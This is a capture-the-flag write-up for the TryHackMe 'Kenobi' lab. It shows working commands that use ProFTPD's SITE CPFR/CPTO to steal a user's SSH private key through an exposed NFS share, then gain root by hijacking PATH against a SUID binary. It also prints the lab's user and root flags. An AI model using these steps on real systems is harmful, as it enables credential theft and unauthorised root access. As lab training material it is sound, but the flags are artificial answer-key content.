# TryHackMe-Kenobi

> Abdullah Rizwan | 09:57 PM


## NMAP

```
Nmap scan report for 10.10.93.137                                                                                                                   
Host is up (0.17s latency).                                               
Not shown: 993 closed ports                                               
PORT     STATE SERVICE     VERSION                                        
21/tcp   open  ftp         ProFTPD 1.3.5  
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                      
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)                                                                                     
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry                         
|_/admin.html                                                                                                                                       
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:                                                                
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs                
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40755/tcp   mountd
|   100005  1,2,3      43479/udp6  mountd     
|   100005  1,2,3      52935/tcp6  mountd
|   100005  1,2,3      60855/udp   mountd
|   100021  1,3,4      36153/tcp   nlockmgr
|   100021  1,3,4      38263/tcp6  nlockmgr
|   100021  1,3,4      45056/udp   nlockmgr
  100021  1,3,4      36153/tcp   nlockmgr                                                                                                   [3/35]
|   100021  1,3,4      38263/tcp6  nlockmgr
|   100021  1,3,4      45056/udp   nlockmgr                                                                                                         
|   100021  1,3,4      45196/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00 
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-10-04T11:58:20-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-04T16:58:19
|_  start_date: N/A


```


## SMB

We know that port 139 and 445 is open so we can try using `smbclient`

```
smbclient -L \\\\10.10.93.137\\
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
root@kali:~/TryHackMe/Easy/Kenobi# smbclient \\\\10.10.93.137\\anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 15:49:09 2019
  ..                                  D        0  Wed Sep  4 15:56:07 2019
  log.txt                             N    12237  Wed Sep  4 15:49:09 2019


                9204224 blocks of size 1024. 6876284 blocks available
```
We'll `log.txt` so to get it locally `get log.txt`

## Rpc Bind PORT 111

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.137`

```
Nmap scan report for 10.10.93.137
Host is up (0.18s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1839224.0  6874404.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds

```

## FTP PORT 21

`nc 10.10.93.137 21`

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.137]
```
Now we can copy the contents from and to , see we know from the `log.txt` that there is an ssh key for user `kenobi` so we can copy it to mnt share which is `var`.

```
root@kali:~/TryHackMe/Easy/Kenobi# nc 10.10.93.137 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.137]
SITE CFPR /home/kenobi/.ssh/id_rsa
500 'SITE CFPR' not understood
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now we need to mount it to our system in system directory `/mnt`


```
root@kali:~/TryHackMe/Easy/Kenobi# mkdir /mnt/kenobiNFS
root@kali:~/TryHackMe/Easy/Kenobi# mount 10.10.93.137:/var /mnt/kenobiNFS
root@kali:~/TryHackMe/Easy/Kenobi# cd /mnt
root@kali:/mnt# ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct  4 22:15 .
drwxr-xr-x 18 root root 4096 Aug 28 06:07 ..
drwxr-xr-x 14 root root 4096 Sep  4  2019 kenobiNFS
root@kali:/mnt# cd Ke
-bash: cd: Ke: No such file or directory
root@kali:/mnt# cd kenobiNFS/
root@kali:/mnt/kenobiNFS# ls -la
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Oct  4 22:15 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 13  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 27  2019 mail
drwxr-xr-x  2 root root    4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 30  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Oct  4 22:13 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www

```

Now to unmount use 

`umount /mnt/kenobiNFS`

## SSH PORT 22

Now that we have the private key , change it's permissions to default `chmod 600 id_rsa` and log in

```
ssh kenobi@10.10.93.137 -i id_rsa
```

User flag : `d0b0f3f53b6caa532a83915e19224899`

## Privilege Escalation 


Looking Set User Id (SUID)

#### Running on Attacker Machine
```
find / -perm -u=s -type f 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/kismet_cap_ti_cc_2531
/usr/bin/kismet_cap_ti_cc_2540
/usr/bin/mount
/usr/bin/bwrap
/usr/bin/chfn
/usr/bin/kismet_cap_nrf_mousejack
/usr/bin/pkexec
/usr/bin/kismet_cap_linux_bluetooth
/usr/bin/kismet_cap_linux_wifi
/usr/bin/chsh
/usr/bin/kismet_cap_nrf_51822
/usr/bin/kismet_cap_nxp_kw41z
/usr/bin/newgrp
/usr/bin/ntfs-3g
/usr/bin/umount
/usr/bin/sudo
/usr/sbin/mount.cifs
/usr/sbin/mount.nfs
/usr/sbin/pppd
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VBoxVolInfo
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/virtualbox/VBoxSDL
/usr/lib/chromium/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/share/discord/chrome-sandbox
/usr/share/code/chrome-sandbox

```

#### Running on Target Machine
```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null 
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
We can see the difference that `/usr/bin/menu` stands very odd


Running the binary we can see `3` options

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $IP

kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# whoami
root
root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/tmp# 

```

Root flag `177b3cd8562289f37382721c28381f02`